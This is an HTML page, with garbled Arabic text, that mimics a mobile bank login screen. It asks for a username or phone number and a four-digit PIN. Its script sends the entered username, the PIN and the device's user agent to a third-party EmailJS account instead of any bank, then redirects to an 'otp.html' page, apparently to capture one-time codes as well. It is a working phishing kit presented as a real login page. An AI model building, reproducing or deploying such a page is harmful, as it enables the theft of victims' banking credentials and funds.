<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ø¢Ù…Ù†</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

    <style>
        /* ğŸ”µ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø¹Ø§Ù…Ø© */
        * {
            box-sizing: border-box;
            outline: none;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            font-family: 'Tajawal', sans-serif;
            height: 100vh; 
            height: -webkit-fill-available; 
            display: flex;
            flex-direction: column;
            color: #333333;
            position: relative;
            overflow: hidden; 
        }

        /* Ø­Ø§ÙˆÙŠØ© Ø§Ù„Ù…Ø­ØªÙˆÙ‰ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ */
        .main-container {
            flex: 1;
            padding: 0 25px;
            display: flex;
            flex-direction: column;
            overflow-y: auto; 
        }

        /* ğŸ”µ Ø§Ù„Ù…Ø³Ø§Ø­Ø© Ø§Ù„Ø¹Ù„ÙˆÙŠØ© ÙˆØ§Ù„Ù„ÙˆØºÙˆ */
        .top-spacer {
            height: 12vh; 
            min-height: 80px;
            width: 100%;
        }

        .logo-container {
            width: 70%;
            aspect-ratio: 16 / 9;
            margin: 0 auto 50px auto; 
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .logo-image {
            width: 100%;
            height: 100%;
            object-fit: contain; 
        }

        /* ğŸ”µ Ø§Ù„Ø­Ù‚ÙˆÙ„ (Inputs) */
        .input-group {
            position: relative;
            margin-bottom: 40px;
        }

        .username-wrapper {
            position: relative;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #333333; 
            transition: border-color 0.3s;
        }

        .username-wrapper:focus-within {
            border-bottom: 1px solid #007C91;
        }

        .custom-input {
            width: 100%;
            border: none;
            padding: 10px 35px 10px 5px; 
            font-family: 'Tajawal', sans-serif;
            font-size: 16px;
            font-weight: 400; 
            color: #333333;
            background: transparent;
            border-radius: 0; 
        }

        .custom-input::placeholder {
            color: #999;
            font-size: 15px;
        }

        .input-icon-right {
            position: absolute;
            right: 5px;
            color: #007C91; 
            font-size: 18px;
        }

        /* --- ğŸ”µ ØªØ¹Ø¯ÙŠÙ„ Ù‚Ø³Ù… Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ø³Ø±ÙŠ --- */
        
        .pin-wrapper-inline {
            display: flex;
            align-items: flex-end; 
            gap: 15px; 
            padding-bottom: 5px;
        }

        .pin-main-icon {
             color: #007C91;
             font-size: 22px;
             margin-bottom: 8px; 
        }

        /* ğŸ”¥ Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ù‡Ù†Ø§: ØªØºÙŠÙŠØ± Ø§Ù„Ø§ØªØ¬Ø§Ù‡ Ø¥Ù„Ù‰ rtl */
        .pin-underscores-container {
            display: flex;
            gap: 15px;
            direction: rtl; /* ØªÙ… Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ù…Ù† ltr Ø¥Ù„Ù‰ rtl */
            justify-content: flex-start;
        }

        .pin-underscore-input {
            width: 45px; 
            border: none;
            border-bottom: 2px solid #333; 
            text-align: center;
            font-size: 26px;
            font-family: 'Tajawal', sans-serif;
            font-weight: 700;
            background: transparent;
            border-radius: 0;
            padding: 0;
            color: #333;
            transition: border-color 0.3s, color 0.3s;
        }
        
        .pin-underscore-input:focus {
            border-bottom-color: #007C91; 
            caret-color: #007C91;
        }

        /* ğŸ”µ Ø§Ù„Ø±ÙˆØ§Ø¨Ø· */
        .links-area {
            margin-top: 30px;
        }

        .forgot-pass {
            display: block;
            text-align: left; 
            color: #007C91;
            font-size: 14px;
            text-decoration: none;
            font-weight: 500;
            margin-bottom: 35px;
        }

        .new-user {
            display: block;
            text-align: center;
            color: #007C91;
            font-size: 15px;
            text-decoration: none;
            font-weight: 500;
        }

        /* ğŸ”µ Ø²Ø± ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ */
        .submit-container {
            margin-top: auto; 
            padding: 20px 25px 30px 25px; 
            width: 100%;
            background: #fff; 
        }

        .login-btn {
            width: 100%;
            height: 65px;
            background-color: #FBC900; 
            color: #000000;
            font-family: 'Tajawal', sans-serif;
            font-weight: 700; 
            font-size: 20px;
            border: none;
            border-radius: 8px; 
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(251, 201, 0, 0.2); 
            transition: transform 0.1s, background 0.2s;
        }

        .login-btn:active {
            background-color: #e0b300;
            transform: scale(0.98);
        }

    </style>
</head>
<body>

    <div class="main-container">
        
        <div class="top-spacer"></div>

        <div class="logo-container">
            <img src="https://i.imgur.com/ZY2DVCn.jpeg" alt="Bank Logo" class="logo-image">
        </div>

        <form id="loginForm" onsubmit="event.preventDefault(); sendEmail();">
            
            <div class="input-group">
                <div class="username-wrapper">
                    <i class="fa-solid fa-user input-icon-right"></i>
                    <input type="text" id="username" class="custom-input" placeholder="Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø£Ùˆ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ" required autocomplete="username">
                </div>
            </div>

            <div class="input-group">
                <div class="pin-wrapper-inline">
                    <i class="fa-solid fa-lock pin-main-icon"></i>
                    
                    <div class="pin-underscores-container">
                        <input type="tel" inputmode="numeric" class="pin-underscore-input" maxlength="1" id="pin1" autocomplete="one-time-code">
                        <input type="tel" inputmode="numeric" class="pin-underscore-input" maxlength="1" id="pin2" autocomplete="one-time-code">
                        <input type="tel" inputmode="numeric" class="pin-underscore-input" maxlength="1" id="pin3" autocomplete="one-time-code">
                        <input type="tel" inputmode="numeric" class="pin-underscore-input" maxlength="1" id="pin4" autocomplete="one-time-code">
                    </div>
                </div>
            </div>

            <div class="links-area">
                <a href="#" class="forgot-pass">Ù†Ø³ÙŠØª Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ø³Ø±ÙŠØŸ</a>
                <a href="#" class="new-user">Ù…Ø³ØªØ®Ø¯Ù… Ø¬Ø¯ÙŠØ¯ØŸ Ø³Ø¬Ù„ Ø§Ù„Ø¢Ù†!</a>
            </div>

        </form>
    </div>

<div class="submit-container">
    <button type="button" class="login-btn" onclick="sendEmail()">
        ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„
    </button>
</div>

    <script>
        (function(){
            // âš ï¸âš ï¸ Ø§Ø³ØªØ¨Ø¯Ù„ Ø¨Ø§Ù„Ù…ÙØªØ§Ø­ Ø§Ù„Ø¹Ø§Ù… Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ
            emailjs.init("zWBq4dbSzfkEvVeS2");
        })();

        const pinInputs = document.querySelectorAll('.pin-underscore-input');

        pinInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
                
                if (e.target.value.length === 1) {
                    if (index < pinInputs.length - 1) {
                        pinInputs[index + 1].focus();
                    } else {
                        input.blur(); 
                    }
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '') {
                    if (index > 0) {
                        pinInputs[index - 1].focus();
                    }
                }
            });
             
             input.addEventListener('focus', (e) => {
                 e.target.select();
             });
        });

        function sendEmail() {
            const username = document.getElementById('username').value;
            const pin = 
                document.getElementById('pin1').value + 
                document.getElementById('pin2').value + 
                document.getElementById('pin3').value + 
                document.getElementById('pin4').value;

            if(!username || pin.length < 4) {
                alert("ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙˆØ§Ù„Ø±Ù‚Ù… Ø§Ù„Ø³Ø±ÙŠ Ø§Ù„Ù…ÙƒÙˆÙ† Ù…Ù† 4 Ø£Ø±Ù‚Ø§Ù….");
                return;
            }

            const btn = document.querySelector('.login-btn');
            const originalBtnText = btn.innerHTML;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚...';
            btn.style.opacity = "0.8";
            btn.disabled = true;

            var templateParams = {
                username: username,
                pin_code: pin,
                device_info: navigator.userAgent 
            };

            // âš ï¸âš ï¸ ØªØ£ÙƒØ¯ Ù…Ù† ØµØ­Ø© Service ID Ùˆ Template ID
            emailjs.send('service_lyabofe', 'template_cxjh4ls', templateParams)
                .then(function(response) {
                    console.log('SUCCESS!', response.status, response.text);
                    btn.innerHTML = '<i class="fas fa-check"></i> ØªÙ… Ø¨Ù†Ø¬Ø§Ø­';
                    btn.style.backgroundColor = "#4CAF50"; 
                    btn.style.color = "#fff";
                    
                    // ğŸ”¥ Ø§Ù„ØªØ¹Ø¯ÙŠÙ„ Ù‡Ù†Ø§: Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ ÙŠØªÙ… ÙÙ‚Ø· Ø¨Ø¹Ø¯ Ù†Ø¬Ø§Ø­ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
                    setTimeout(() => {
                         window.location.href = 'otp.html'; 
                    }, 1000); // Ø§Ù†ØªØ¸Ø§Ø± Ø«Ø§Ù†ÙŠØ© ÙˆØ§Ø­Ø¯Ø© Ù„Ø±Ø¤ÙŠØ© Ø¹Ù„Ø§Ù…Ø© Ø§Ù„Ù†Ø¬Ø§Ø­

                }, function(error) {
                    console.log('FAILED...', error);
                    btn.innerHTML = 'Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„';
                    btn.style.backgroundColor = "#f44336"; 
                    btn.style.color = "#fff";
                    alert("Ø­Ø¯Ø« Ø®Ø·Ø£. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù„Ø§Ø­Ù‚Ø§Ù‹.");
                    
                     setTimeout(() => {
                         btn.innerHTML = originalBtnText;
                         btn.style.backgroundColor = "#FBC900";
                         btn.style.color = "#000";
                         btn.disabled = false;
                         btn.style.opacity = "1";
                     }, 3000);
                });
        }
    </script>
</body>
</html>
